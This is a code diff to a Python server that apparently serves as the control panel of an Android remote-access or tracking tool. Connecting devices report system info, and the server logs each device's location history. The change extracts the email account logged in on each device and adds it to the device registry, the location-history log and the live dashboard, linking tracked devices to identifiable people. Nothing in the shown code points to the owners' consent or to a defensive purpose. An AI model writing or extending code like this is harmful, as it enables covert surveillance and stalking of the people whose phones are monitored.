@@ -546,8 +546,13 @@ def handle_new_connection(client, addr, counter):
             sys_data = json.loads(sys_info_out)
             android_id = sys_data.get('android_id', android_id)
             device_name = sys_data.get('device_name', '')
+            
+            client_email = sys_data.get('email', '')
+            if client_email in ["", "null", "No User Logged In"]:
+                client_email = ''
         except:
             device_name = sys_info_out
+            client_email = ''
             
     # Pop temp client and register under android_id
     if temp_id in clients:
@@ -561,15 +566,17 @@ def handle_new_connection(client, addr, counter):
                 pass
             
         client_data['sys_info'] = device_name
+        client_data['email'] = client_email
         clients[android_id] = client_data
         
-        print(f"[*] Device Registered | ID: {android_id} | Name: {device_name}")
+        print(f"[*] Device Registered | ID: {android_id} | Name: {device_name} | Email: {client_email}")
         socketio.emit('client_connected', {
             'client_id': android_id,
             'ip': addr[0],
             'port': addr[1],
             'connected_at': client_data['connected_at'],
             'sys_info': device_name,
+            'email': client_email,
             'battery': '',
             'network_info': ''
         }, namespace='/')
@@ -663,10 +670,12 @@ def log_location_history(client_id, lat, lng, details):
     """Log a location update to the history file"""
     try:
         device_name = clients.get(client_id, {}).get('sys_info', '')
+        client_email = clients.get(client_id, {}).get('email', '')
         log_entry = {
             'timestamp': datetime.now().isoformat(),
             'client_id': client_id,
             'device_name': device_name,
+            'email': client_email,
             'lat': lat,
             'lng': lng,
             'details': details
@@ -723,6 +732,7 @@ def get_clients():
             'connected_at': client_info['connected_at'],
             'last_seen': client_info['last_seen'],
             'sys_info': client_info.get('sys_info', ''),
+            'email': client_info.get('email', ''),
             'battery': client_info.get('battery', ''),
             'network_info': client_info.get('network_info', '')
         }
@@ -892,6 +902,7 @@ def handle_connect():
             'port': client_info['addr'][1],
             'connected_at': client_info['connected_at'],
             'sys_info': client_info.get('sys_info', ''),
+            'email': client_info.get('email', ''),
             'battery': client_info.get('battery', ''),
             'network_info': client_info.get('network_info', '')
         })
